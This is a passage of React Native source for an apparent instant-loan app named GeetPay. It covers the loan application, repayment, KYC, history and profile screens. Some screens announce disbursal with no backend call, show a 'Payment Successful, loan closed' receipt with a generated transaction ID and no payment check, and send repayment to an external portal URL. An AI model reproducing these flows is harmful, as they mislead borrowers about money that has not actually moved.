                <Text style={[styles.chipText, amount === val ? styles.chipTextActive : null]}>
                  {val >= 100000 ? '₹1 Lakh' : `₹${val / 1000}k`}
                </Text>
              </TouchableOpacity>
            ))}
          </View>

          {/* Stepper buttons */}
          <View style={styles.stepperRow}>
            <TouchableOpacity
              style={styles.stepperBtn}
              onPress={() => setAmount(Math.max(5000, amount - 5000))}
            >
              <Text style={styles.stepperBtnText}>- ₹5,000</Text>
            </TouchableOpacity>
            <TouchableOpacity
              style={[styles.stepperBtn, { backgroundColor: NAVY }]}
              onPress={() => setAmount(Math.min(100000, amount + 5000))}
            >
              <Text style={[styles.stepperBtnText, { color: '#FFFFFF' }]}>+ ₹5,000</Text>
            </TouchableOpacity>
          </View>
        </Card>

        {/* Tenure Selection */}
        <Text style={styles.sectionTitle}>Select Repayment Duration</Text>
        <View style={styles.tenureRow}>
          {[15, 30, 45, 60].map((days) => (
            <TouchableOpacity
              key={days}
              style={[styles.tenureCard, tenure === days ? styles.tenureCardActive : null]}
              onPress={() => setTenure(days)}
            >
              <Text style={[styles.tenureDays, tenure === days ? styles.tenureDaysActive : null]}>{days} Days</Text>
              <Text style={[styles.tenureSub, tenure === days ? styles.tenureSubActive : null]}>1% / day</Text>
            </TouchableOpacity>
          ))}
        </View>

        {/* Live Calculation Preview */}
        <Text style={styles.sectionTitle}>Loan Summary</Text>
        <Card style={styles.breakdownCard}>
          <View style={styles.breakdownRow}>
            <Text style={styles.breakdownLabel}>Approved Amount</Text>
            <Text style={styles.breakdownVal}>{fmt(amount)}</Text>
          </View>
          <View style={styles.breakdownRow}>
            <Text style={styles.breakdownLabel}>Processing Fee (10%)</Text>
            <Text style={[styles.breakdownVal, { color: '#E11D48' }]}>- {fmt(fee)}</Text>
          </View>
          <View style={styles.breakdownRow}>
            <Text style={styles.breakdownLabel}>GST (18% on fee)</Text>
            <Text style={[styles.breakdownVal, { color: '#E11D48' }]}>- {fmt(gst)}</Text>
          </View>
          <View style={[styles.breakdownRow, styles.disbursedHighlightRow]}>
            <Text style={styles.disbursedHighlightLabel}>You Will Receive</Text>
            <Text style={styles.disbursedHighlightVal}>{fmt(disbursed)}</Text>
          </View>
          <View style={styles.breakdownDivider} />
          <View style={styles.breakdownRow}>
            <Text style={styles.breakdownLabel}>Interest ({tenure} days @ 1%/day)</Text>
            <Text style={styles.breakdownVal}>{fmt(totalInterest)}</Text>
          </View>
          <View style={styles.breakdownRow}>
            <Text style={[styles.breakdownLabel, { fontWeight: '700', color: NAVY_DARK }]}>Total Repayment</Text>
            <Text style={[styles.breakdownVal, { fontWeight: '800', color: NAVY, fontSize: 16 }]}>{fmt(totalRepay)}</Text>
          </View>
        </Card>

        {/* Bank Selection */}
        <Card style={styles.bankSelectCard}>
          <Text style={styles.bankSelectTitle}>Disbursal Account</Text>
          <View style={styles.bankSelectRow}>
            <Building2 size={20} color={NAVY} />
            <Text style={styles.bankSelectName}>{USER_DATA.bank}</Text>
            <CheckCircle size={18} color={GREEN} style={{ marginLeft: 'auto' }} />
          </View>
        </Card>

        <TouchableOpacity
          style={[styles.primaryBtn, { backgroundColor: GREEN }]}
          onPress={() => {
            Alert.alert('Loan Applied!', `₹${disbursed.toLocaleString('en-IN')} will be credited to ${USER_DATA.bank} within 5 minutes.`, [
              { text: 'OK', onPress: () => navigate('home') },
            ]);
          }}
          activeOpacity={0.85}
        >
          <Text style={styles.primaryBtnText}>Instant Disbursal</Text>
          <Zap size={18} color="#FFFFFF" />
        </TouchableOpacity>
      </ScrollView>
    </SafeAreaView>
  );
}

// ─── 6. Repay Screen ────────────────────────────────────────────────────────────
function RepayScreen({
  navigate,
  data,
}: {
  navigate: (s: Screen) => void;
  data?: DashboardDataResponse | null;
}) {
  const loan = data?.loan || LOAN_DATA;
  const user = data?.user || USER_DATA;

  const [mode, setMode] = useState<'full' | 'custom'>('full');
  const [customAmt, setCustomAmt] = useState(loan.outstanding > 0 ? String(Math.round(loan.outstanding / 2)) : '2500');
  const [method, setMethod] = useState('gpay');

  const amountToPay = mode === 'full' ? loan.outstanding : Number(customAmt) || 0;

  return (
    <SafeAreaView style={{ flex: 1, backgroundColor: BG }}>
      <Header title="Repay Loan" onBack={() => navigate('home')} />
      <ScrollView contentContainerStyle={styles.detailContainer}>
        {/* Amount Card */}
        <Card style={styles.repayAmountCard}>
          <Text style={styles.repayAmountLabel}>Total Outstanding</Text>
          <Text style={styles.repayAmountVal}>{fmt(loan.outstanding)}</Text>
          <Text style={styles.repayDueInfo}>Due Date: {loan.dueDate}</Text>

          <View style={styles.modeTabs}>
            <TouchableOpacity
              style={[styles.modeTab, mode === 'full' ? styles.modeTabActive : null]}
              onPress={() => setMode('full')}
            >
              <Text style={[styles.modeTabText, mode === 'full' ? styles.modeTabTextActive : null]}>Pay Full Amount</Text>
            </TouchableOpacity>
            <TouchableOpacity
              style={[styles.modeTab, mode === 'custom' ? styles.modeTabActive : null]}
              onPress={() => setMode('custom')}
            >
              <Text style={[styles.modeTabText, mode === 'custom' ? styles.modeTabTextActive : null]}>Custom Partial</Text>
            </TouchableOpacity>
          </View>

          {mode === 'custom' && (
            <View style={styles.customInputWrap}>
              <Text style={styles.rupeePrefix}>₹</Text>
              <TextInput
                style={styles.customInput}
                keyboardType="numeric"
                value={customAmt}
                onChangeText={setCustomAmt}
                placeholder="Enter amount"
              />
            </View>
          )}
        </Card>

        {/* Payment Methods */}
        <Text style={styles.sectionTitle}>Select Payment Option</Text>

        {[
          { id: 'gpay', title: 'Google Pay / PhonePe / Paytm', desc: 'Instant UPI Payment', icon: Smartphone },
          { id: 'qr', title: 'Scan UPI QR Code', desc: 'Pay via any BHIM UPI App', icon: QrCode },
          { id: 'netbanking', title: 'Net Banking', desc: 'All Indian Banks Supported', icon: Building2 },
          { id: 'card', title: 'Debit Card', desc: 'Visa, MasterCard, RuPay', icon: CreditCard },
        ].map((item) => {
          const Icon = item.icon;
          const active = method === item.id;
          return (
            <TouchableOpacity
              key={item.id}
              style={[styles.methodCard, active ? styles.methodCardActive : null]}
              onPress={() => setMethod(item.id)}
              activeOpacity={0.8}
            >
              <View style={[styles.methodIconWrap, active ? { backgroundColor: '#E0E7FF' } : null]}>
                <Icon size={20} color={active ? NAVY : TEXT_MUTED} />
              </View>
              <View style={{ marginLeft: 12, flex: 1 }}>
                <Text style={[styles.methodTitle, active ? { color: NAVY_DARK, fontWeight: '700' } : null]}>{item.title}</Text>
                <Text style={styles.methodDesc}>{item.desc}</Text>
              </View>
              <View style={[styles.radioCircle, active ? styles.radioCircleActive : null]}>
                {active && <View style={styles.radioInner} />}
              </View>
            </TouchableOpacity>
          );
        })}

        <TouchableOpacity
          style={[styles.primaryBtn, { backgroundColor: GREEN, marginTop: 24 }]}
          onPress={() => Linking.openURL(REPAY_PORTAL_URL).catch(() => { })}
          activeOpacity={0.85}
        >
          <Text style={styles.primaryBtnText}>Proceed to Repay {fmt(amountToPay)}</Text>
          <ArrowUpRight size={18} color="#FFFFFF" />
        </TouchableOpacity>
      </ScrollView>
    </SafeAreaView>
  );
}

// ─── 7. Payment Success Screen ──────────────────────────────────────────────────
function PaySuccessScreen({
  navigate,
  data,
}: {
  navigate: (s: Screen) => void;
  data?: DashboardDataResponse | null;
}) {
  const loan = data?.loan || LOAN_DATA;

  return (
    <SafeAreaView style={{ flex: 1, backgroundColor: '#FFFFFF' }}>
      <ScrollView contentContainerStyle={styles.successContainer}>
        <View style={styles.successIconCircle}>
          <Check size={44} color="#FFFFFF" strokeWidth={3} />
        </View>

        <Text style={styles.successTitle}>Payment Successful!</Text>
        <Text style={styles.successAmount}>{fmt(loan.outstanding)}</Text>
        <Text style={styles.successSub}>Your loan has been successfully closed and updated.</Text>

        <Card style={styles.receiptCard}>
          <View style={styles.receiptRow}>
            <Text style={styles.receiptLabel}>Transaction ID</Text>
            <Text style={styles.receiptVal}>TXN{Date.now().toString().slice(-11)}</Text>
          </View>
          <View style={styles.receiptRow}>
            <Text style={styles.receiptLabel}>Loan ID</Text>
            <Text style={styles.receiptVal}>{loan.id || 'LN-9230'}</Text>
          </View>
          <View style={styles.receiptRow}>
            <Text style={styles.receiptLabel}>Payment Mode</Text>
            <Text style={styles.receiptVal}>UPI Instant</Text>
          </View>
          <View style={styles.receiptRow}>
            <Text style={styles.receiptLabel}>Status</Text>
            <View style={styles.paidBadge}>
              <Text style={styles.paidBadgeText}>CLOSED ✓</Text>
            </View>
          </View>
        </Card>

        <TouchableOpacity
          style={[styles.primaryBtn, { backgroundColor: NAVY, width: '100%' }]}
          onPress={() => navigate('home')}
          activeOpacity={0.85}
        >
          <Text style={styles.primaryBtnText}>Back to Home</Text>
        </TouchableOpacity>
      </ScrollView>
    </SafeAreaView>
  );
}

// ─── 8. KYC Screen ──────────────────────────────────────────────────────────────
function KYCScreen({
  navigate,
  data,
}: {
  navigate: (s: Screen) => void;
  data?: DashboardDataResponse | null;
}) {
  const user = data?.user || USER_DATA;
  const kyc = data?.kyc;

  const defaultSteps = [
    { title: 'PAN Card Verification', desc: user.pan && user.pan !== 'Not Linked' ? `PAN: ${user.pan} (${user.name})` : 'PAN Not Linked', status: user.pan && user.pan !== 'Not Linked' ? 'Verified' : 'Pending', completed: Boolean(user.pan && user.pan !== 'Not Linked') },
    { title: 'Aadhaar Card (e-KYC)', desc: user.aadhaar ? `Aadhaar: ${user.aadhaar} (${user.name})` : 'Aadhaar Not Linked', status: user.aadhaar ? 'Verified' : 'Pending', completed: Boolean(user.aadhaar) },
    { title: 'Bank Account Linked', desc: user.bank || 'No Bank Linked', status: user.bank && user.bank !== 'No Bank Linked' ? 'Active' : 'Pending', completed: Boolean(user.bank && user.bank !== 'No Bank Linked') },
    { title: 'Employment & Income', desc: user.employer ? `${user.employer} • Salary Verified` : 'Employment Not Provided', status: user.employer ? 'Verified' : 'Pending', completed: Boolean(user.employer) },
  ];

  const steps = kyc?.steps && kyc.steps.length > 0 ? kyc.steps : defaultSteps;
  const isComplete = kyc ? kyc.isComplete : steps.every((s) => s.completed);
  const percent = kyc?.completionPercent ?? (isComplete ? 100 : 50);
  const title = kyc?.title || (isComplete ? 'KYC 100% Completed' : `KYC ${percent}% Completed`);
  const desc = kyc?.desc || (isComplete ? 'Your profile is fully verified for instant loans up to ₹1,00,000' : 'Complete remaining verification steps to activate instant loans');

  return (
    <SafeAreaView style={{ flex: 1, backgroundColor: BG }}>
      <Header title="KYC & Verification" onBack={() => navigate('home')} />
      <ScrollView contentContainerStyle={styles.detailContainer}>
        {/* Status Banner */}
        <LinearGradient
          colors={isComplete ? [GREEN, '#1E7D14'] : ['#EAB308', '#CA8A04']}
          style={styles.kycHeroCard}
        >
          <Shield size={32} color="#FFFFFF" />
          <Text style={styles.kycHeroTitle}>{title}</Text>
          <Text style={styles.kycHeroDesc}>{desc}</Text>
        </LinearGradient>

        <Text style={styles.sectionTitle}>Verified Documents</Text>

        {steps.map((s, idx) => (
          <Card key={idx} style={styles.kycStepCard}>
            <View style={styles.kycStepLeft}>
              <View
                style={[
                  styles.kycCheckCircle,
                  !s.completed && { backgroundColor: '#CBD5E1' },
                ]}
              >
                {s.completed ? (
                  <Check size={16} color="#FFFFFF" strokeWidth={3} />
                ) : (
                  <Lock size={14} color="#FFFFFF" />
                )}
              </View>
              <View style={{ marginLeft: 12, flex: 1 }}>
                <Text style={styles.kycStepTitle}>{s.title}</Text>
                <Text style={styles.kycStepDesc} numberOfLines={2}>{s.desc}</Text>
              </View>
            </View>
            <View
              style={[
                styles.verifiedPill,
                !s.completed && { backgroundColor: '#F1F5F9' },
              ]}
            >
              <Text
                style={[
                  styles.verifiedPillText,
                  !s.completed && { color: '#64748B' },
                ]}
              >
                {s.status}
              </Text>
            </View>
          </Card>
        ))}
      </ScrollView>
    </SafeAreaView>
  );
}

// ─── 9. History Screen ──────────────────────────────────────────────────────────
function HistoryScreen({
  navigate,
  data,
}: {
  navigate: (s: Screen) => void;
  data?: DashboardDataResponse | null;
}) {
  const [tab, setTab] = useState<'transactions' | 'loans'>('transactions');
  const transactions = data?.transactions || TRANSACTIONS;
  const history = data?.history || HISTORY_DATA;

  return (
    <SafeAreaView style={{ flex: 1, backgroundColor: BG }}>
      <Header title="Activity & History" onBack={() => navigate('home')} />
      <ScrollView contentContainerStyle={styles.detailContainer}>
        <View style={styles.historyTabs}>
          <TouchableOpacity
            style={[styles.historyTab, tab === 'transactions' ? styles.historyTabActive : null]}
            onPress={() => setTab('transactions')}
          >
            <Text style={[styles.historyTabText, tab === 'transactions' ? styles.historyTabTextActive : null]}>
              Transactions ({transactions.length})
            </Text>
          </TouchableOpacity>
          <TouchableOpacity
            style={[styles.historyTab, tab === 'loans' ? styles.historyTabActive : null]}
            onPress={() => setTab('loans')}
          >
            <Text style={[styles.historyTabText, tab === 'loans' ? styles.historyTabTextActive : null]}>
              Past Loans ({history.length})
            </Text>
          </TouchableOpacity>
        </View>

        {tab === 'transactions' && (
          <View>
            {transactions.length > 0 ? (
              transactions.map((item, idx) => (
                <Card key={idx} style={styles.txnCard}>
                  <View style={styles.txnLeft}>
                    <View style={[styles.txnIconWrap, { backgroundColor: item.credit ? '#E8F5E9' : '#FFF1F2' }]}>
                      {item.credit ? (
                        <ArrowLeft size={16} color={GREEN} style={{ transform: [{ rotate: '45deg' }] }} />
                      ) : (
                        <ArrowUpRight size={16} color="#E11D48" />
                      )}
                    </View>
                    <View style={{ marginLeft: 12, flex: 1 }}>
                      <Text style={styles.txnTitle} numberOfLines={1}>
                        {item.label}
                      </Text>
                      <Text style={styles.txnDate}>
                        {item.date} {item.sublabel ? `• ${item.sublabel}` : ''}
                      </Text>
                    </View>
                  </View>
                  <Text style={[styles.txnAmount, { color: item.credit ? GREEN : NAVY_DARK }]}>
                    {item.credit ? '+' : '-'}{fmt(item.amount)}
                  </Text>
                </Card>
              ))
            ) : (
              <Card style={[styles.txnCard, { paddingVertical: 20, alignItems: 'center' }]}>
                <Text style={{ color: '#64748B', fontSize: 13 }}>No transaction activity recorded yet.</Text>
              </Card>
            )}
          </View>
        )}

        {tab === 'loans' && (
          <View>
            {history.length > 0 ? (
              history.map((loan) => (
                <Card key={loan.id} style={styles.historyCard}>
                  <View style={styles.rowBetween}>
                    <Text style={styles.historyLoanId}>Loan #{loan.id}</Text>
                    <View style={styles.closedBadge}>
                      <Text style={styles.closedBadgeText}>{loan.status?.toUpperCase() || 'CLOSED'}</Text>
                    </View>
                  </View>
                  <Text style={styles.historyPrincipal}>{fmt(loan.amount)}</Text>
                  <View style={styles.historyDivider} />
                  <View style={styles.rowBetween}>
                    <Text style={styles.historyMetaLabel}>
                      Total Paid: <Text style={{ fontWeight: '700', color: NAVY_DARK }}>{fmt(loan.paid)}</Text>
                    </Text>
                    <Text style={styles.historyMetaLabel}>Tenure: {loan.duration} Days</Text>
                  </View>
                  <Text style={styles.historyDateText}>Repaid on {loan.repaid}</Text>
                </Card>
              ))
            ) : (
              <Card style={[styles.txnCard, { paddingVertical: 20, alignItems: 'center' }]}>
                <Text style={{ color: '#64748B', fontSize: 13 }}>No past closed loans found.</Text>
              </Card>
            )}
          </View>
        )}
      </ScrollView>
    </SafeAreaView>
  );
}

// ─── 10. Notifications Screen ───────────────────────────────────────────────────
function NotificationsScreen({
  navigate,
  data,
}: {
  navigate: (s: Screen) => void;
  data?: DashboardDataResponse | null;
}) {
  const notifs = data?.notifications && data.notifications.length > 0 ? data.notifications : NOTIFS_DATA;

  return (
    <SafeAreaView style={{ flex: 1, backgroundColor: BG }}>
      <Header title="Notifications" onBack={() => navigate('home')} />
      <ScrollView contentContainerStyle={styles.detailContainer}>
        {notifs.map((item) => (
          <Card key={item.id} style={[styles.notifCard, item.unread ? styles.notifCardUnread : null]}>
            <View style={styles.notifHeaderRow}>
              <Text style={styles.notifTitle}>{item.title}</Text>
              <Text style={styles.notifTime}>{item.time}</Text>
            </View>
            <Text style={styles.notifBody}>{item.body}</Text>
          </Card>
        ))}
      </ScrollView>
    </SafeAreaView>
  );
}

// ─── 11. Support Screen ─────────────────────────────────────────────────────────
function SupportScreen({ navigate }: { navigate: (s: Screen) => void }) {
  const [expandedFaq, setExpandedFaq] = useState<number | null>(null);

  return (
    <SafeAreaView style={{ flex: 1, backgroundColor: BG }}>
      <Header title="24x7 Help & Support" onBack={() => navigate('home')} />
      <ScrollView contentContainerStyle={styles.detailContainer}>
        {/* Contact channels */}
        <Text style={styles.sectionTitle}>Contact Us</Text>
        <View style={styles.contactRow}>
          <TouchableOpacity
            style={styles.contactBox}
            onPress={() => Alert.alert('WhatsApp Support', 'Opening WhatsApp chat with GeetPay Support (+91 98765 00000)...')}
          >
            <MessageCircle size={24} color={GREEN} />
            <Text style={styles.contactBoxTitle}>WhatsApp</Text>
            <Text style={styles.contactBoxSub}>Instant Chat</Text>
          </TouchableOpacity>

          <TouchableOpacity
            style={styles.contactBox}
            onPress={() => Alert.alert('Call Support', 'Dialing GeetPay Helpline: 1800-123-4567')}
          >
            <Phone size={24} color={NAVY} />
            <Text style={styles.contactBoxTitle}>Call Us</Text>
            <Text style={styles.contactBoxSub}>Toll Free</Text>
          </TouchableOpacity>

          <TouchableOpacity
            style={styles.contactBox}
            onPress={() => Alert.alert('Email Support', 'support@geetpay.com')}
          >
            <Mail size={24} color="#0284C7" />
            <Text style={styles.contactBoxTitle}>Email</Text>
            <Text style={styles.contactBoxSub}>24h Response</Text>
          </TouchableOpacity>
        </View>

        {/* FAQs */}
        <Text style={[styles.sectionTitle, { marginTop: 24 }]}>Frequently Asked Questions</Text>
        {FAQS.map((faq, idx) => {
          const isOpen = expandedFaq === idx;
          return (
            <Card key={idx} style={styles.faqCard}>
              <TouchableOpacity
                style={styles.faqHeader}
                onPress={() => setExpandedFaq(isOpen ? null : idx)}
                activeOpacity={0.7}
              >
                <Text style={styles.faqQuestion}>{faq.q}</Text>
                <ChevronDown size={18} color={NAVY} style={{ transform: [{ rotate: isOpen ? '180deg' : '0deg' }] }} />
              </TouchableOpacity>
              {isOpen && <Text style={styles.faqAnswer}>{faq.a}</Text>}
            </Card>
          );
        })}
      </ScrollView>
    </SafeAreaView>
  );
}

// ─── 12. Profile Screen ─────────────────────────────────────────────────────────
function ProfileScreen({
  navigate,
  data,
  onLogout,
}: {
  navigate: (s: Screen) => void;
  data?: DashboardDataResponse | null;
  onLogout?: () => void;
}) {
  const user = data?.user || USER_DATA;
  const avatarInitials = (user.name.split(' ').map((n) => n[0]).join('') || 'GP').slice(0, 2).toUpperCase();

  return (
    <SafeAreaView style={{ flex: 1, backgroundColor: BG }}>
      <Header title="My Profile" onBack={() => navigate('home')} />
      <ScrollView contentContainerStyle={styles.detailContainer}>
        {/* User Card */}
        <Card style={styles.profileUserCard}>
          <View style={styles.profileAvatarLarge}>
            {user.avatar ? (
              <Image source={{ uri: user.avatar }} style={{ width: 72, height: 72, borderRadius: 36 }} />
            ) : (
              <Text style={styles.profileAvatarTextLarge}>{avatarInitials}</Text>
            )}
          </View>
          <Text style={styles.profileNameText}>{user.name}</Text>
          <Text style={styles.profilePhoneText}>{user.phone}</Text>
          <Text style={styles.profileEmailText}>{user.email}</Text>
        </Card>

        {/* Financial Info */}
        <Text style={styles.sectionTitle}>Identity & Banking</Text>
        <Card style={styles.profileDetailCard}>
          <View style={styles.profileInfoRow}>
            <Text style={styles.profileInfoLabel}>PAN Card</Text>
            <Text style={styles.profileInfoVal}>{user.pan || 'ABCPS1234H'}</Text>
          </View>
          <View style={styles.profileInfoRow}>
            <Text style={styles.profileInfoLabel}>Aadhaar</Text>
            <Text style={styles.profileInfoVal}>{user.aadhaar || 'XXXX XXXX 6789'}</Text>
          </View>
          <View style={styles.profileInfoRow}>
            <Text style={styles.profileInfoLabel}>Employer</Text>
            <Text style={styles.profileInfoVal}>{user.employer || 'Private Limited'}</Text>
          </View>
          <View style={styles.profileInfoRow}>
            <Text style={styles.profileInfoLabel}>Linked Bank</Text>
            <Text style={styles.profileInfoVal}>{user.bank || 'HDFC Bank •••• 4321'}</Text>
          </View>
        </Card>

        <TouchableOpacity
          style={styles.logoutBtn}
          onPress={() => {
            if (onLogout) onLogout();
            else navigate('login');
          }}
          activeOpacity={0.8}
        >
          <LogOut size={18} color="#E11D48" />
          <Text style={styles.logoutBtnText}>Log Out</Text>
        </TouchableOpacity>
      </ScrollView>
    </SafeAreaView>
  );
}

// ─── Bottom Navigation Bar ──────────────────────────────────────────────────────
function BottomNavBar({
  activeTab,
  onSelectTab,
}: {
  activeTab: string;
  onSelectTab: (t: string) => void;
}) {
  const tabs = [
    { id: 'home', label: 'Home', icon: Home },
    { id: 'loan-detail', label: 'Loans', icon: CreditCard },
    { id: 'repay', label: 'Repay', icon: RefreshCw },
    { id: 'support', label: 'Support', icon: Headphones },
    { id: 'profile', label: 'Profile', icon: User },
  ];

  return (
    <View style={styles.bottomNavWrapper}>
      <View style={styles.bottomNavContainer}>
        {tabs.map((tab) => {
          const Icon = tab.icon;
          const active = activeTab === tab.id;
          return (
            <TouchableOpacity
              key={tab.id}
              style={styles.bottomNavItem}
              onPress={() => {
                if (tab.id === 'repay') {
                  Linking.openURL(REPAY_PORTAL_URL).catch(() => { });
                } else {
                  onSelectTab(tab.id);
                }
              }}
              activeOpacity={0.7}
            >
              {active && <View style={styles.bottomNavActiveIndicator} />}
              <Icon size={22} color={active ? NAVY : '#94A3B8'} strokeWidth={active ? 2.5 : 1.8} />
              <Text style={[styles.bottomNavLabel, active ? styles.bottomNavLabelActive : null]}>
                {tab.label}
              </Text>
            </TouchableOpacity>
          );
        })}
      </View>
    </View>
  );
}

// ─── Persistent Session Helpers ────────────────────────────────────────────────
const SESSION_STORAGE_KEY = 'GEETPAY_USER_SESSION_V1';

interface StoredSession {
  phone: string;
  screen: Screen;
  user?: any;
}

const getStoredSession = (): StoredSession | null => {
  try {
    if (typeof window !== 'undefined' && window.localStorage) {
      const raw = window.localStorage.getItem(SESSION_STORAGE_KEY);
      if (raw) return JSON.parse(raw);
    }
  } catch (e) { }
  return null;
};

const setStoredSession = (session: StoredSession | null) => {
  try {
    if (typeof window !== 'undefined' && window.localStorage) {
      if (session) {
        window.localStorage.setItem(SESSION_STORAGE_KEY, JSON.stringify(session));
      } else {
        window.localStorage.removeItem(SESSION_STORAGE_KEY);
      }
    }
  } catch (e) { }
};

// ─── Main Root App ─────────────────────────────────────────────────────────────
export default function App() {
  const initialSession = getStoredSession();

  const [screen, setScreen] = useState<Screen>(
    initialSession ? (['login', 'otp'].includes(initialSession.screen) ? 'home' : initialSession.screen) : 'login'
  );
  const [phoneInput, setPhoneInput] = useState(initialSession?.phone || '');
  const [devOtpCode, setDevOtpCode] = useState('');
  const [currentUser, setCurrentUser] = useState<any>(initialSession?.user || null);
  const [dashboardData, setDashboardData] = useState<DashboardDataResponse | null>(null);

  const loadDashboard = async (phone: string) => {
    try {
      const data = await fetchDisbursedLoanDashboard(phone);
      if (data) {
        setDashboardData(data);
      }
    } catch (e) { }
  };

  // Restore dashboard data automatically on mount if session exists
  useEffect(() => {
    if (initialSession?.phone) {
      loadDashboard(initialSession.phone);
    }
  }, []);

  const navigate = (s: Screen) => {
    setScreen(s);
    if (!['login', 'otp'].includes(s)) {
      setStoredSession({
        phone: phoneInput,
        screen: s,
        user: currentUser,
      });
    }
  };

  const handleLogout = () => {
    setStoredSession(null);
    setDashboardData(null);
    setCurrentUser(null);
    setScreen('login');
  };

  const showBottomNav = !['login', 'otp', 'pay-success'].includes(screen);

  return (
    <View style={styles.rootContainer}>
      <ExpoStatusBar style="auto" />
      <View style={styles.mainContent}>
        {screen === 'login' && (
          <LoginScreen
            onNext={(p, devOtp) => {
              setPhoneInput(p);
              if (devOtp) setDevOtpCode(devOtp);
              loadDashboard(p);
              navigate('otp');
            }}
          />
        )}
        {screen === 'otp' && (
          <OTPScreen
            phone={phoneInput}
            devOtp={devOtpCode}
            onVerify={async (user) => {
              if (user) setCurrentUser(user);
              setStoredSession({
                phone: phoneInput,
                screen: 'home',
                user: user || null,
              });
              await loadDashboard(phoneInput);
              navigate('home');
            }}
            onBack={() => navigate('login')}
          />
        )}
        {screen === 'home' && <HomeScreen navigate={navigate} data={dashboardData} />}
        {screen === 'loan-detail' && <LoanDetailScreen navigate={navigate} data={dashboardData} />}
        {screen === 'apply' && <ApplyScreen navigate={navigate} />}
        {screen === 'repay' && <RepayScreen navigate={navigate} data={dashboardData} />}
        {screen === 'pay-success' && <PaySuccessScreen navigate={navigate} data={dashboardData} />}
        {screen === 'history' && <HistoryScreen navigate={navigate} data={dashboardData} />}
        {screen === 'notifications' && <NotificationsScreen navigate={navigate} data={dashboardData} />}
        {screen === 'profile' && <ProfileScreen navigate={navigate} data={dashboardData} onLogout={handleLogout} />}
        {screen === 'support' && <SupportScreen navigate={navigate} />}
        {screen === 'kyc' && <KYCScreen navigate={navigate} data={dashboardData} />}
      </View>

      {showBottomNav && (
        <BottomNavBar
          activeTab={screen}
          onSelectTab={(tabId) => navigate(tabId as Screen)}
        />
      )}
    </View>
  );
}

// ─── StyleSheet ────────────────────────────────────────────────────────────────
const styles = StyleSheet.create({
  rootContainer: {
    flex: 1,
    backgroundColor: BG,
  },
  mainContent: {
    flex: 1,
  },
  screenBg: {
    flex: 1,
    backgroundColor: BG,
  },
  card: {
    backgroundColor: CARD_BG,
    borderRadius: 24,
    padding: 16,
    borderWidth: 1,
    borderColor: BORDER_COLOR,
    shadowColor: NAVY,
    shadowOffset: { width: 0, height: 4 },
    shadowOpacity: 0.05,
    shadowRadius: 12,
    elevation: 3,
  },
  header: {
    flexDirection: 'row',
    alignItems: 'center',
    justifyContent: 'space-between',
    paddingHorizontal: 16,
    paddingTop: Platform.OS === 'android' ? 44 : 12,
    paddingBottom: 12,
    backgroundColor: '#FFFFFF',
    borderBottomWidth: 1,
    borderBottomColor: BORDER_COLOR,
  },
  headerBackBtn: {
    width: 36,
    height: 36,
    borderRadius: 18,
    backgroundColor: '#F1F5F9',
    alignItems: 'center',
    justifyContent: 'center',
  },
  headerTitle: {
    fontSize: 17,
    fontWeight: '700',
    color: NAVY_DARK,
  },
  primaryBtn: {
    backgroundColor: NAVY,
    borderRadius: 18,
    paddingVertical: 16,
    paddingHorizontal: 20,
    flexDirection: 'row',
    alignItems: 'center',
    justifyContent: 'center',
    shadowColor: NAVY,
    shadowOffset: { width: 0, height: 6 },
    shadowOpacity: 0.15,
    shadowRadius: 12,
    elevation: 4,
  },
  primaryBtnText: {
    color: '#FFFFFF',
    fontSize: 16,
    fontWeight: '700',
    marginRight: 6,
  },
  sectionTitle: {
    fontSize: 16,
    fontWeight: '700',
    color: NAVY_DARK,
    marginBottom: 12,
  },
  sectionPad: {
    paddingHorizontal: 16,
    marginBottom: 20,
  },
  rowBetween: {
    flexDirection: 'row',
    alignItems: 'center',
    justifyContent: 'space-between',
  },

  // Login
  loginHero: {
    paddingTop: 80,
    paddingBottom: 50,
    paddingHorizontal: 24,
    borderBottomLeftRadius: 40,
    borderBottomRightRadius: 40,
    alignItems: 'center',
  },
  brandBadge: {
    backgroundColor: '#FFFFFF',
    paddingHorizontal: 20,
    paddingVertical: 8,
    borderRadius: 16,
    marginBottom: 10,
  },
  brandName: {
    fontSize: 26,
    fontWeight: '900',
    color: NAVY,
    letterSpacing: 0.5,
  },
  loginSubtitle: {
    color: 'rgba(255,255,255,0.75)',
    fontSize: 14,
    fontWeight: '500',
    marginBottom: 20,
  },
  trustBadges: {
    flexDirection: 'row',
    gap: 12,
  },
  trustBadgeItem: {
    flexDirection: 'row',
    alignItems: 'center',
    gap: 4,
  },
  trustBadgeText: {
    color: '#FFFFFF',
    fontSize: 12,
    fontWeight: '600',
  },
  loginCardContainer: {
    paddingHorizontal: 16,
    marginTop: -30,
    paddingBottom: 40,
  },
  loginCard: {
    padding: 22,
    borderRadius: 28,
  },
  loginCardTitle: {
    fontSize: 20,
    fontWeight: '800',
    color: NAVY_DARK,
    marginBottom: 4,
  },
  loginCardSubtitle: {
    fontSize: 13,
    color: TEXT_MUTED,
    marginBottom: 20,
  },
  inputLabel: {
    fontSize: 12,
    fontWeight: '700',
    color: NAVY_DARK,
    marginBottom: 8,
    textTransform: 'uppercase',
  },
  phoneInputWrap: {
    flexDirection: 'row',
    borderWidth: 1.5,
    borderColor: '#E2E8F0',
    borderRadius: 16,
    overflow: 'hidden',
    marginBottom: 20,
  },
  countryCodeWrap: {
    backgroundColor: '#F8FAFC',
    paddingHorizontal: 14,
    justifyContent: 'center',
    borderRightWidth: 1,
    borderRightColor: '#E2E8F0',
  },
  countryCodeText: {
    fontSize: 15,
    fontWeight: '600',
    color: NAVY_DARK,
  },
  phoneInput: {
    flex: 1,
    paddingHorizontal: 14,
    paddingVertical: 14,
    fontSize: 16,
    fontWeight: '600',
    color: NAVY_DARK,
  },
  loginSecurityNotice: {
    flexDirection: 'row',
    alignItems: 'center',
    justifyContent: 'center',
    gap: 6,
    marginTop: 16,
  },
  loginSecurityText: {
    fontSize: 11,
    color: TEXT_MUTED,
    textAlign: 'center',
  },
  featuresRow: {
    flexDirection: 'row',
    justifyContent: 'space-between',
    marginTop: 24,
    gap: 8,
  },
  featureBox: {
    flex: 1,
    backgroundColor: '#FFFFFF',
    padding: 14,
    borderRadius: 20,
    alignItems: 'center',
    borderWidth: 1,
    borderColor: BORDER_COLOR,
  },
  featureBoxTitle: {
    fontSize: 12,
    fontWeight: '700',
    color: NAVY_DARK,
    marginTop: 8,
    textAlign: 'center',
  },
  featureBoxDesc: {
    fontSize: 10,
    color: TEXT_MUTED,
    marginTop: 2,
    textAlign: 'center',
  },

  // OTP
  otpContainer: {
    padding: 24,
    alignItems: 'center',
  },
  otpIconWrap: {
    width: 64,
    height: 64,
    borderRadius: 32,
